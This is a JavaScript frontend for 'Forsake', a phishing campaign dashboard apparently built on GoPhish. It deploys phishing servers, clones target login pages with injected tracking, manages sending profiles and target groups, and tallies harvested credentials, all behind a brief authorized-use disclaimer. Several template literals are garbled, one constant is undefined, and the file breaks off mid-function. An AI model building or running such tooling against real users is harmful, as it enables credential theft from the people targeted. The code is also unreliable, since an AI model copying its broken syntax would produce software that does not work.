/**
 * ═══════════════════════════════════════════════════════════════════════════
 * FORSAKE — Command & Control Dashboard
 * Frontend application with dangerous cyberpunk aesthetic
 * Created by ANONYMOUS-BETA
 * ═══════════════════════════════════════════════════════════════════════════
 */

(function() {
    'use strict';

    // ─── Configuration ─────────────────────────────────────────────────
    const CONFIG = {
        API_BASE: '',
        WS_URL: `\( {location.protocol === 'https:' ? 'wss:' : 'ws:'}// \){location.host}/api/ws`,
        REFRESH_INTERVAL: 15000,
    };

    // ─── State ─────────────────────────────────────────────────────────
    const state = {
        token: localStorage.getItem('forsake_token'),
        user_id: null,
        currentView: 'dashboard',
        ws: null,
        refreshTimer: null,
        campaigns: [],
        deployment: null,
    };

    // ─── DOM References ────────────────────────────────────────────────
    const $ = (sel) => document.querySelector(sel);
    const $$ = (sel) => document.querySelectorAll(sel);

    // ─── API Client ────────────────────────────────────────────────────
    const api = {
        async request(method, path, body = null) {
            const headers = { 'Content-Type': 'application/json' };
            if (state.token) {
                headers['Authorization'] = `Bearer ${state.token}`;
            }

            const opts = { method, headers };
            if (body) opts.body = JSON.stringify(body);

            try {
                const resp = await fetch(`\( {CONFIG.API_BASE} \){path}`, opts);
                if (resp.status === 401) {
                    // Session expired
                    logout();
                    return null;
                }
                return await resp.json();
            } catch (err) {
                console.error(`API error: ${method} ${path}`, err);
                return null;
            }
        },

        get(path) { return this.request('GET', path); },
        post(path, data) { return this.request('POST', path, data); },
        delete(path) { return this.request('DELETE', path); },
    };

    // ─── WebSocket ─────────────────────────────────────────────────────
    function connectWS() {
        if (!state.token) return;
        
        try {
            state.ws = new WebSocket(CONFIG.WS_URL);
            state.ws.onopen = () => {
                updateConnectionStatus(true);
                state.ws.send(JSON.stringify({ type: 'auth', token: state.token }));
            };
            state.ws.onclose = () => {
                updateConnectionStatus(false);
                setTimeout(connectWS, 5000);
            };
            state.ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    handleWSMessage(data);
                } catch (e) {}
            };
        } catch (e) {
            updateConnectionStatus(false);
        }
    }

    function handleWSMessage(data) {
        if (data.type === 'campaign_update' || data.type === 'stats_update') {
            if (state.currentView === 'dashboard') loadDashboard();
            if (state.currentView === 'campaigns') loadCampaigns();
        }
    }

    function updateConnectionStatus(connected) {
        const dot = $('#connection-status .status-dot');
        const text = $('#connection-status .status-text');
        if (dot && text) {
            dot.className = `status-dot ${connected ? '' : 'disconnected'}`;
            text.textContent = connected ? 'Connected' : 'Disconnected';
        }
    }

    // ─── Toast Notifications ───────────────────────────────────────────
    function showToast(message, type = 'info') {
        const container = $('#toast-container');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.textContent = `[${type.toUpperCase()}] ${message}`;
        container.appendChild(toast);

        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transition = 'opacity 0.3s';
            setTimeout(() => toast.remove(), 300);
        }, 4000);
    }

    // ─── Matrix Rain Effect ───────────────────────────────────────────
    function initMatrix() {
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas) return;

        const ctx = canvas.getContext('2d');
        let width, height, columns, drops;

        function resize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            columns = Math.floor(width / 14);
            drops = Array(columns).fill(1);
        }

        resize();
        window.addEventListener('resize', resize);

        const chars = 'FORSAKE☠☢☣01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';

        function draw() {
            ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
            ctx.fillRect(0, 0, width, height);

            ctx.fillStyle = '#ff001a';
            ctx.font = '13px monospace';

            for (let i = 0; i < drops.length; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillStyle = Math.random() > 0.95 ? '#ff001a' : 'rgba(255, 0, 26, 0.3)';
                ctx.fillText(char, i * 14, drops[i] * 14);

                if (drops[i] * 14 > height && Math.random() > 0.98) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 50);
    }

    // ─── Authentication ────────────────────────────────────────────────
    async function login(username, password) {
        const result = await api.post('/api/auth/login', { username, password });
        if (result && result.token) {
            state.token = result.token;
            state.user_id = result.user_id;
            localStorage.setItem('forsake_token', result.token);
            showLoginScreen(false);
            initApp();
            showToast('Authenticated successfully', 'success');
        } else {
            const errEl = $('#login-error');
            if (errEl) errEl.textContent = 'Invalid credentials. Access denied.';
            showToast('Authentication failed', 'error');
        }
    }

    function logout() {
        if (state.token) {
            api.post('/api/auth/logout');
        }
        state.token = null;
        state.user_id = null;
        localStorage.removeItem('forsake_token');
        if (state.ws) state.ws.close();
        if (state.refreshTimer) clearInterval(state.refreshTimer);
        showLoginScreen(true);
        showToast('Disconnected', 'info');
    }

    function showLoginScreen(show) {
        $('#login-screen').className = `screen ${show ? 'active' : ''}`;
        $('#main-app').className = `screen ${show ? '' : 'active'}`;
    }

    // ─── View Router ──────────────────────────────────────────────────
    function navigateTo(view) {
        state.currentView = view;

        // Update nav
        \[ ('.nav-item').forEach(el => el.classList.remove('active'));
        const navItem = document.querySelector(`.nav-item[data-view="${view}"]`);
        if (navItem) navItem.classList.add('active');

        // Load view
        const container = $('#view-container');
        if (!container) return;

        switch (view) {
            case 'dashboard': loadDashboard(); break;
            case 'campaigns': loadCampaigns(); break;
            case 'deploy': loadDeployView(); break;
            case 'landing': loadLandingPages(); break;
            case 'resources': loadResources(); break;
            case 'audit': loadAuditLog(); break;
            case 'settings': loadSettings(); break;
            default: loadDashboard();
        }
    }

    // ─── Dashboard View ───────────────────────────────────────────────
    async function loadDashboard() {
        const container = $('#view-container');
        container.innerHTML = `<div class="loading"><div class="spinner"></div> Loading dashboard...</div>`;

        const stats = await api.get('/api/dashboard/stats') || {};
        const deployment = stats.deployment || {};

        container.innerHTML = `
            <div class="page-header">
                <h1 class="typing" style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">
                    ☠ DASHBOARD — FORSAKE OPERATIONAL OVERVIEW
                </h1>
                <div class="page-actions">
                    <button class="btn-secondary" onclick="location.reload()">⟳ Refresh</button>
                </div>
            </div>

            <div class="deployment-status" style="margin:16px 0;padding:12px 16px;background:var(--bg-panel);border:1px solid var(--border-color);border-left:3px solid ${deployment.status === 'active' ? 'var(--accent-green)' : 'var(--accent-red)'};">
                <span style="font-size:11px;letter-spacing:2px;color:var(--text-muted);">
                    DEPLOYMENT: </span>
                <span style="font-size:13px;color:${deployment.status === 'active' ? 'var(--accent-green)' : 'var(--text-secondary)'};">
                    ${deployment.domain || 'Not deployed'}
                </span>
                <span style="margin-left:20px;font-size:10px;color:var(--text-muted);">
                    ${deployment.status === 'active' ? '🟢 ONLINE' : '⚫ OFFLINE'}
                </span>
                ${deployment.admin_url ? `<span style="margin-left:16px;">
                    <a href="${deployment.admin_url}" target="_blank" style="font-size:11px;">Open Admin →</a>
                </span>` : ''}
            </div>

            <div class="stats-grid">
                <div class="stat-card danger">
                    <div class="stat-label">Campaigns</div>
                    <div class="stat-value">${stats.total_campaigns || 0}</div>
                    <div class="stat-sub">Total phishing campaigns</div>
                </div>
                <div class="stat-card info">
                    <div class="stat-label">Emails Sent</div>
                    <div class="stat-value">${stats.total_sent || 0}</div>
                    <div class="stat-sub">Delivered to targets</div>
                </div>
                <div class="stat-card warning">
                    <div class="stat-label">Opened</div>
                    <div class="stat-value">${stats.total_opened || 0}</div>
                    <div class="stat-sub">${stats.total_sent ? Math.round(stats.total_opened/stats.total_sent*100) : 0}% open rate</div>
                </div>
                <div class="stat-card" style="border-color:var(--accent-orange);">
                    <div class="stat-label">Clicked</div>
                    <div class="stat-value" style="color:var(--accent-orange);">${stats.total_clicked || 0}</div>
                    <div class="stat-sub">${stats.total_sent ? Math.round(stats.total_clicked/stats.total_sent*100) : 0}% click rate</div>
                </div>
                <div class="stat-card success">
                    <div class="stat-label">Credentials</div>
                    <div class="stat-value">${stats.total_submitted || 0}</div>
                    <div class="stat-sub">Credentials harvested</div>
                </div>
                <div class="stat-card" style="border-color:var(--accent-yellow);">
                    <div class="stat-label">Reported</div>
                    <div class="stat-value" style="color:var(--accent-yellow);">${stats.total_reported || 0}</div>
                    <div class="stat-sub">Reported by users</div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <h2>◈ Recent Campaigns</h2>
                    <div class="panel-actions">
                        <button class="btn-secondary" onclick="window.app.navigate('campaigns')">View All</button>
                    </div>
                </div>
                <div class="panel-body">
                    ${renderCampaignTable(stats.recent_campaigns || [])}
                </div>
            </div>
        `;
    }

    function renderCampaignTable(campaigns) {
        if (!campaigns || campaigns.length === 0) {
            return `<div style="text-align:center;padding:40px;color:var(--text-muted);">
                No campaigns yet. Deploy and create your first campaign.
            </div>`;
        }

        return `
            <table class="data-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Name</th>
                        <th>Status</th>
                        <th>Sent</th>
                        <th>Opened</th>
                        <th>Clicked</th>
                        <th>Credentials</th>
                        <th>Created</th>
                    </tr>
                </thead>
                <tbody>
                    ${campaigns.map(c => `
                        <tr>
                            <td>#${c.id}</td>
                            <td style="color:var(--text-primary);">${escHtml(c.name)}</td>
                            <td><span class="status-badge \( {(c.status || '').toLowerCase()}"> \){c.status || 'Unknown'}</span></td>
                            <td>${c.total || 0}</td>
                            <td>${c.opened || 0}</td>
                            <td>${c.clicked || 0}</td>
                            <td style="color:var(--accent-red);">${c.submitted || 0}</td>
                            <td style="color:var(--text-muted);font-size:11px;">${formatDate(c.created_date)}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        `;
    }

    // ─── Campaigns View ────────────────────────────────────────────────
    async function loadCampaigns() {
        const container = $('#view-container');
        container.innerHTML = `<div class="loading"><div class="spinner"></div> Loading campaigns...</div>`;

        const campaigns = await api.get('/api/campaigns') || [];

        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">◎ Campaigns</h1>
                <div class="page-actions">
                    <button class="btn-secondary" onclick="window.app.loadCampaigns()">⟳ Refresh</button>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <h2>All Campaigns (${campaigns.length})</h2>
                </div>
                <div class="panel-body">
                    ${campaigns.length === 0 ? `
                        <div style="text-align:center;padding:60px 20px;color:var(--text-muted);">
                            <div style="font-size:48px;margin-bottom:16px;">◎</div>
                            <p style="font-size:16px;margin-bottom:8px;">No campaigns deployed</p>
                            <p style="font-size:12px;">Go to <a href="#" onclick="window.app.navigate('deploy')">Deploy</a> to set up your phishing infrastructure, then create campaigns in the GoPhish admin panel.</p>
                        </div>
                    ` : `
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Name</th>
                                    <th>Status</th>
                                    <th>Results</th>
                                    <th>Opened</th>
                                    <th>Clicked</th>
                                    <th>Data</th>
                                    <th>Created</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${campaigns.map(c => `
                                    <tr>
                                        <td>#${c.id}</td>
                                        <td style="color:var(--text-primary);">${escHtml(c.name)}</td>
                                        <td><span class="status-badge \( {(c.status||'').toLowerCase()}"> \){c.status}</span></td>
                                        <td>${(c.results||[]).length}</td>
                                        <td>${(c.results||[]).filter(r=>r.opened_at).length}</td>
                                        <td>${(c.results||[]).filter(r=>r.clicked_at).length}</td>
                                        <td style="color:var(--accent-red);">${(c.results||[]).filter(r=>r.submitted_data).length}</td>
                                        <td style="font-size:11px;color:var(--text-muted);">${formatDate(c.created_date)}</td>
                                        <td>
                                            <button class="btn-danger" style="padding:4px 10px;font-size:10px;" 
                                                    onclick="window.app.deleteCampaign(${c.id})">Delete</button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    `}
                </div>
            </div>
        `;
    }

    async function deleteCampaign(id) {
        if (!confirm(`Delete campaign #${id}? This cannot be undone.`)) return;
        const result = await api.delete(`/api/campaigns/${id}`);
        if (result) {
            showToast(`Campaign #${id} deleted`, 'success');
            loadCampaigns();
        } else {
            showToast('Failed to delete campaign', 'error');
        }
    }

    // ─── Deploy View ──────────────────────────────────────────────────
    async function loadDeployView() {
        const status = await api.get('/api/status') || {};
        const isDeployed = status.status === 'active' || status.status === 'deployed';

        const container = $('#view-container');
        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">◈ Deployment Center</h1>
            </div>

            ${isDeployed ? `
                <div class="panel" style="border-color:var(--accent-green);">
                    <div class="panel-header">
                        <h2 style="color:var(--accent-green);">🟢 ACTIVE DEPLOYMENT</h2>
                        <div class="panel-actions">
                            <button class="btn-danger" id="teardown-btn">⏻ Teardown</button>
                        </div>
                    </div>
                    <div class="panel-body">
                        <div class="form-row" style="margin-bottom:16px;">
                            <div>
                                <div class="form-group">
                                    <label>Domain</label>
                                    <input type="text" value="${status.domain || 'N/A'}" readonly style="opacity:0.6;">
                                </div>
                            </div>
                            <div>
                                <div class="form-group">
                                    <label>Version</label>
                                    <input type="text" value="${status.version || 'N/A'}" readonly style="opacity:0.6;">
                                </div>
                            </div>
                        </div>
                        <div class="form-row">
                            <div>
                                <div class="form-group">
                                    <label>Admin Panel</label>
                                    <input type="text" value="${status.admin_url || 'N/A'}" readonly style="opacity:0.6;">
                                </div>
                            </div>
                            <div>
                                <div class="form-group">
                                    <label>Phishing URL</label>
                                    <input type="text" value="${status.phishing_url || 'N/A'}" readonly style="opacity:0.6;">
                                </div>
                            </div>
                        </div>
                        <div style="margin-top:12px;display:flex;gap:8px;">
                            <span class="status-badge ${status.gophish_running ? 'active' : 'draft'}">GoPhish: ${status.gophish_running ? 'Running' : 'Stopped'}</span>
                            <span class="status-badge ${status.nginx_running ? 'active' : 'draft'}">NGINX: ${status.nginx_running ? 'Running' : 'Stopped'}</span>
                            <span class="status-badge ${status.certs_valid ? 'active' : 'draft'}">SSL: ${status.certs_valid ? 'Valid' : 'Missing'}</span>
                        </div>
                    </div>
                </div>
            ` : ''}

            <div class="panel">
                <div class="panel-header">
                    <h2>${isDeployed ? 'Redeploy' : 'New Deployment'}</h2>
                </div>
                <div class="panel-body">
                    <form id="deploy-form">
                        <div class="form-row">
                            <div class="form-group">
                                <label>Domain *</label>
                                <input type="text" id="deploy-domain" placeholder="phish.yourdomain.com" required
                                    \( {isDeployed ? `value=" \){status.domain || ''}"` : ''}>
                            </div>
                            <div class="form-group">
                                <label>Email (for Let's Encrypt)</label>
                                <input type="email" id="deploy-email" placeholder="admin@yourdomain.com">
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label>Admin Password (leave blank to auto-generate)</label>
                                <input type="password" id="deploy-password" placeholder="Auto-generated if empty">
                            </div>
                            <div class="form-group">
                                <label>Landing Page URL (optional, will be cloned)</label>
                                <input type="url" id="deploy-clone" placeholder="https://login.target.com">
                            </div>
                        </div>
                        <div class="form-group">
                            <label>SMTP Relay (optional)</label>
                            <input type="text" id="deploy-smtp" placeholder="smtp.example.com:587">
                        </div>
                        <div style="display:flex;gap:12px;align-items:center;">
                            <button type="submit" class="btn-primary" style="width:auto;padding:12px 32px;">
                                ${isDeployed ? '⟳ Redeploy' : '▶ Deploy'}
                            </button>
                            <span style="font-size:11px;color:var(--text-muted);letter-spacing:1px;">
                                This will configure GoPhish + NGINX + SSL
                            </span>
                        </div>
                    </form>
                </div>
            </div>

            <div id="deploy-result" style="display:none;"></div>
        `;

        // Wire up forms
        $('#deploy-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            await handleDeploy();
        });

        const teardownBtn = $('#teardown-btn');
        if (teardownBtn) {
            teardownBtn.addEventListener('click', async () => {
                if (confirm('☠ TEARDOWN: This will stop all services and remove NGINX configs. Continue?')) {
                    const remove = confirm('Remove all data too (campaigns, landing pages, certs)?');
                    const result = await api.post('/api/teardown', { remove_data: remove });
                    if (result) {
                        showToast('Forsake removed from system', 'info');
                        loadDeployView();
                    }
                }
            });
        }
    }

    async function handleDeploy() {
        const domain = $('#deploy-domain').value.trim();
        if (!domain) {
            showToast('Domain is required', 'error');
            return;
        }

        const data = {
            domain: domain,
            email: $('#deploy-email').value.trim() || null,
            admin_password: $('#deploy-password').value.trim() || null,
            clone_url: $('#deploy-clone').value.trim() || null,
            smtp_host: $('#deploy-smtp').value.trim() || null,
        };

        const resultDiv = $('#deploy-result');
        resultDiv.style.display = 'block';
        resultDiv.innerHTML = `<div class="loading"><div class="spinner"></div> Deploying Forsake... This may take a few minutes.</div>`;

        const result = await api.post('/api/deploy', data);

        if (result && result.status) {
            const isError = result.status === 'error';
            resultDiv.innerHTML = `
                <div class="panel" style="border-color:${isError ? 'var(--accent-red)' : 'var(--accent-green)'};margin-top:16px;">
                    <div class="panel-header">
                        <h2 style="color:${isError ? 'var(--accent-red)' : 'var(--accent-green)'}">
                            ${isError ? '✖ Deployment Failed' : '✔ Deployment Complete'}
                        </h2>
                    </div>
                    <div class="panel-body">
                        ${result.admin_password ? `
                            <div style="margin-bottom:16px;padding:12px;background:var(--bg-tertiary);border:1px solid var(--border-color);">
                                <p style="font-size:10px;letter-spacing:2px;color:var(--text-muted);margin-bottom:4px;">ADMIN PASSWORD</p>
                                <p style="font-size:16px;color:var(--accent-red);font-family:monospace;">${result.admin_password}</p>
                                <p style="font-size:10px;color:var(--accent-yellow);margin-top:4px;">⚠ Save this — it will not be shown again</p>
                            </div>
                        ` : ''}
                        ${result.api_key ? `
                            <div style="margin-bottom:16px;padding:12px;background:var(--bg-tertiary);border:1px solid var(--border-color);">
                                <p style="font-size:10px;letter-spacing:2px;color:var(--text-muted);margin-bottom:4px;">API KEY</p>
                                <p style="font-size:14px;color:var(--accent-cyan);font-family:monospace;">${result.api_key}</p>
                            </div>
                        ` : ''}
                        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
                            ${(result.steps || []).map(s => 
                                `<span class="status-badge \( {s[1] === 'ok' ? 'active' : 'draft'}"> \){s[0]}: ${s[1]}</span>`
                            ).join('')}
                        </div>
                        ${result.errors && result.errors.length ? `
                            <div style="padding:12px;background:rgba(255,0,26,0.05);border:1px solid rgba(255,0,26,0.2);margin-top:8px;">
                                <p style="font-size:10px;letter-spacing:2px;color:var(--accent-red);margin-bottom:4px;">ERRORS</p>
                                ${result.errors.map(e => `<p style="font-size:11px;color:var(--accent-red-dim);">✖ ${e}</p>`).join('')}
                            </div>
                        ` : ''}
                        <div style="margin-top:12px;">
                            <a href="${result.admin_url || '#'}" target="_blank" class="btn-secondary" style="display:inline-block;text-decoration:none;">
                                Open Admin Panel →
                            </a>
                            <span style="margin-left:12px;font-size:11px;color:var(--text-muted);">
                                Completed in ${result.elapsed_seconds || '?'}s
                            </span>
                        </div>
                    </div>
                </div>
            `;
            showToast(isError ? 'Deployment had errors' : 'Forsake deployed successfully', isError ? 'error' : 'success');
        } else {
            resultDiv.innerHTML = `
                <div class="panel" style="border-color:var(--accent-red);margin-top:16px;">
                    <div class="panel-header">
                        <h2 style="color:var(--accent-red);">✖ Deployment Failed</h2>
                    </div>
                    <div class="panel-body">
                        <p style="color:var(--accent-red);">Server returned an error. Check the logs for details.</p>
                    </div>
                </div>
            `;
            showToast('Deployment failed', 'error');
        }
    }

    // ─── Landing Pages View ────────────────────────────────────────────
    async function loadLandingPages() {
        const container = $('#view-container');
        container.innerHTML = `<div class="loading"><div class="spinner"></div> Loading landing pages...</div>`;

        const pages = await api.get('/api/landing-pages') || [];

        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">◻ Landing Pages</h1>
                <div class="page-actions">
                    <button class="btn-secondary" onclick="window.app.loadLandingPages()">⟳ Refresh</button>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <h2>Clone New Page</h2>
                </div>
                <div class="panel-body">
                    <form id="clone-form" style="display:flex;gap:12px;align-items:flex-end;">
                        <div class="form-group" style="flex:1;margin-bottom:0;">
                            <label>Target URL</label>
                            <input type="url" id="clone-url" placeholder="https://login.target.com" required>
                        </div>
                        <div class="form-group" style="flex:0 0 200px;margin-bottom:0;">
                            <label>Name (optional)</label>
                            <input type="text" id="clone-name" placeholder="Auto-generated">
                        </div>
                        <button type="submit" class="btn-primary" style="width:auto;padding:10px 24px;">Clone</button>
                    </form>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <h2>Cloned Pages (${pages.length})</h2>
                </div>
                <div class="panel-body">
                    ${pages.length === 0 ? `
                        <div style="text-align:center;padding:40px;color:var(--text-muted);">
                            No landing pages cloned yet. Enter a URL above to clone one.
                        </div>
                    ` : `
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>HTML Files</th>
                                    <th>Size</th>
                                    <th>Path</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${pages.map(p => `
                                    <tr>
                                        <td style="color:var(--text-primary);">${escHtml(p.name)}</td>
                                        <td>${p.html_files}</td>
                                        <td>${formatBytes(p.size_bytes)}</td>
                                        <td style="font-size:11px;color:var(--text-muted);">${escHtml(p.path)}</td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    `}
                </div>
            </div>
        `;

        $('#clone-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const url = $('#clone-url').value.trim();
            const name = $('#clone-name').value.trim() || null;
            if (!url) return;

            const btn = e.target.querySelector('button');
            btn.textContent = 'Cloning...';
            btn.disabled = true;

            const result = await api.post('/api/landing-pages/clone', { url, name });
            
            btn.textContent = 'Clone';
            btn.disabled = false;

            if (result) {
                showToast(`Page cloned: ${result.files_injected} files with tracking`, 'success');
                loadLandingPages();
            } else {
                showToast('Failed to clone page', 'error');
            }
        });
    }

    // ─── Resources View ────────────────────────────────────────────────
    async function loadResources() {
        const container = $('#view-container');
        container.innerHTML = `<div class="loading"><div class="spinner"></div> Loading resources...</div>`;

        const [templates, pages, smtp, groups] = await Promise.all([
            api.get('/api/resources/templates'),
            api.get('/api/resources/pages'),
            api.get('/api/resources/smtp'),
            api.get('/api/resources/groups'),
        ]);

// ─── Resources View (continued) ──────────────────────────────────
        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">◐ Resources</h1>
                <div class="page-actions">
                    <button class="btn-secondary" onclick="window.app.loadResources()">⟳ Refresh</button>
                </div>
            </div>

            <div class="stats-grid" style="grid-template-columns:repeat(4,1fr);">
                <div class="stat-card info">
                    <div class="stat-label">Email Templates</div>
                    <div class="stat-value" style="font-size:28px;">${(templates||[]).length}</div>
                </div>
                <div class="stat-card success">
                    <div class="stat-label">Landing Pages</div>
                    <div class="stat-value" style="font-size:28px;">${(pages||[]).length}</div>
                </div>
                <div class="stat-card warning">
                    <div class="stat-label">SMTP Profiles</div>
                    <div class="stat-value" style="font-size:28px;">${(smtp||[]).length}</div>
                </div>
                <div class="stat-card" style="border-color:var(--accent-orange);">
                    <div class="stat-label">Target Groups</div>
                    <div class="stat-value" style="font-size:28px;color:var(--accent-orange);">${(groups||[]).length}</div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header"><h2>Email Templates</h2></div>
                <div class="panel-body">${renderResourceList(templates, 'template', ['name', 'subject'])}</div>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>Landing Pages (GoPhish)</h2></div>
                <div class="panel-body">${renderResourceList(pages, 'page', ['name'])}</div>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>SMTP Sending Profiles</h2></div>
                <div class="panel-body">${renderResourceList(smtp, 'smtp', ['name', 'host'])}</div>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>Target Groups</h2></div>
                <div class="panel-body">${renderResourceList(groups, 'group', ['name', 'targets'])}</div>
            </div>
        `;
    }

    function renderResourceList(items, type, fields) {
        if (!items || items.length === 0) {
            return `<div style="padding:20px;color:var(--text-muted);text-align:center;">No ${type}s found. Create them in the GoPhish admin panel.</div>`;
        }
        return `
            <table class="data-table">
                <thead><tr>\( {fields.map(f => `<th> \){f.toUpperCase()}</th>`).join('')}<th>ID</th></tr></thead>
                <tbody>
                    ${items.map(item => {
                        const row = fields.map(f => {
                            let val = item[f];
                            if (f === 'targets' && Array.isArray(val)) val = val.length + ' targets';
                            if (f === 'subject') val = (val || '').substring(0, 50);
                            return `<td style="color:var(--text-primary);font-size:12px;">${escHtml(String(val||'-'))}</td>`;
                        }).join('');
                        return `<tr>\( {row}<td style="color:var(--text-muted);font-size:11px;"># \){item.id}</td></tr>`;
                    }).join('')}
                </tbody>
            </table>
        `;
    }

    // ─── Audit Log View ──────────────────────────────────────────────
    async function loadAuditLog() {
        const container = $('#view-container');
        container.innerHTML = `<div class="loading"><div class="spinner"></div> Loading audit log...</div>`;

        const entries = await api.get('/api/audit-log?limit=200') || [];

        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">◉ Audit Log</h1>
                <div class="page-actions">
                    <button class="btn-secondary" onclick="window.app.loadAuditLog()">⟳ Refresh</button>
                </div>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>Event History (${entries.length})</h2></div>
                <div class="panel-body">
                    ${entries.length === 0 ? '<div style="padding:20px;color:var(--text-muted);text-align:center;">No audit events recorded.</div>' : `
                        <table class="data-table">
                            <thead><tr><th>Time</th><th>Action</th><th>Details</th><th>IP</th></tr></thead>
                            <tbody>
                                ${entries.map(e => `
                                    <tr>
                                        <td style="font-size:11px;color:var(--text-muted);">${formatDate(e.created_at)}</td>
                                        <td style="color:var(--accent-cyan);">${escHtml(e.action)}</td>
                                        <td style="font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis;">${escHtml(e.details||'-')}</td>
                                        <td style="font-size:11px;color:var(--text-muted);">${e.ip_address || '-'}</td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    `}
                </div>
            </div>
        `;
    }

    // ─── Settings View ───────────────────────────────────────────────
    function loadSettings() {
        const container = $('#view-container');
        container.innerHTML = `
            <div class="page-header">
                <h1 style="font-size:20px;letter-spacing:4px;text-transform:uppercase;">⚙ Settings</h1>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>System Information</h2></div>
                <div class="panel-body">
                    <div class="form-row">
                        <div class="form-group">
                            <label>Version</label>
                            <input type="text" value="2.0.0" readonly style="opacity:0.6;">
                        </div>
                        <div class="form-group">
                            <label>Framework</label>
                            <input type="text" value="GoPhish ${GOPHISH_VERSION}" readonly style="opacity:0.6;">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>Creator</label>
                            <input type="text" value="ANONYMOUS-BETA" readonly style="opacity:0.6;">
                        </div>
                        <div class="form-group">
                            <label>Repository</label>
                            <input type="text" value="github.com/anonymous-beta/Forsake" readonly style="opacity:0.6;">
                        </div>
                    </div>
                    <div style="margin-top:16px;padding:16px;background:var(--bg-tertiary);border:1px solid var(--border-color);">
                        <p style="font-size:11px;color:var(--text-muted);letter-spacing:1px;margin-bottom:8px;">☠ AUTHORIZED USE ONLY</p>
                        <p style="font-size:12px;color:var(--text-secondary);line-height:1.6;">
                            Forsake is a penetration testing tool for authorized cybersecurity professionals.
                            Unauthorized use against systems you do not own or have explicit written permission
                            to test is illegal. By using this software, you agree to comply with all applicable laws.
                        </p>
                    </div>
                </div>
            </div>
            <div class="panel">
                <div class="panel-header"><h2>Keyboard Shortcuts</h2></div>
                <div class="panel-body">
                    <table class="data-table">
                        <thead><tr><th>Key</th><th>Action</th></tr></thead>
                        <tbody>
                            <tr><td>\` (backtick)</td><td>Toggle Terminal</td></tr>
                            <tr><td>d</td><td>Dashboard</td></tr>
                            <tr><td>c</td><td>Campaigns</td></tr>
                            <tr><td>p</td><td>Deploy</td></tr>
                            <tr><td>l</td><td>Landing Pages</td></tr>
                            <tr><td>r</td><td>Resources</td></tr>
                            <tr><td>a</td><td>Audit Log</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
    }

    // ─── Terminal ────────────────────────────────────────────────────
    let terminalHistory = [];
    let terminalHistoryIndex = -1;

    function initTerminal() {
        const input = $('#terminal-input');
        if (!input) return;

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = input.value.trim();
                if (cmd) {
                    terminalHistory.push(cmd);
                    terminalHistoryIndex = terminalHistory.length;
                    executeTerminalCommand(cmd);
                }
                input.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (terminalHistoryIndex > 0) {
                    terminalHistoryIndex--;
                    input.value = terminalHistory[terminalHistoryIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (terminalHistoryIndex < terminalHistory.length - 1) {
                    terminalHistoryIndex++;
                    input.value = terminalHistory[terminalHistoryIndex];
                } else {
                    terminalHistoryIndex = terminalHistory.length;
                    input.value = '';
                }
            }
        });
    }

    function executeTerminalCommand(cmd) {
        const output = $('#terminal-output');
        if (!output) return;

        const line = document.createElement('div');
        line.className = 'terminal-line';
        line.innerHTML = `<span class="prompt">[\( {new Date().toLocaleTimeString()}]</span> <span style="color:var(--accent-cyan);"> \) ${escHtml(cmd)}</span>`;
        output.appendChild(line);

        const response = document.createElement('div');
        response.className = 'terminal-line';

        const parts = cmd.toLowerCase().split(' ');
        switch (parts[0]) {
            case 'help':
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> Commands: help, clear, status, stats, version, date, echo, whoami`;
                break;
            case 'clear':
                output.innerHTML = '';
                output.scrollTop = 0;
                return;
            case 'status':
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> Fetching status... Use the Dashboard tab.`;
                break;
            case 'version':
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> Forsake v2.0.0 — by ANONYMOUS-BETA`;
                break;
            case 'date':
